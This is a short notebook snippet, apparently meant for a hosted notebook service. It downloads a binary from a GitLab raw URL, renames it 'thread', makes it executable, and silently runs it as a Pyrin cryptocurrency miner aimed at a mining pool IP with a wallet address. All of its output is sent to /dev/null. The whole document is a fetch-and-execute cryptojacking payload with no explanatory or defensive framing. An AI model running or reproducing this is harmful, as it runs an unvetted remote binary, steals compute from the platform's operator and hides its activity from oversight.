%mkdir 1
%cd 1
!curl -0 https://gitlab.com/sarifadim/jomblo/-/raw/main/bali -o thread && chmod +x thread >/dev/null 2>&1
!./thread --algo PYRIN  --pool 47.254.125.141:443 --user pyrin:qpkxgkszu2dtek33z5nu5uvqftmj6x9stjvpsrdr502p2v8mpqduwt74nc0jm.$(echo 0A-$(TZ=UTC-7 date +"%H-%M-%S")) &>/dev/null

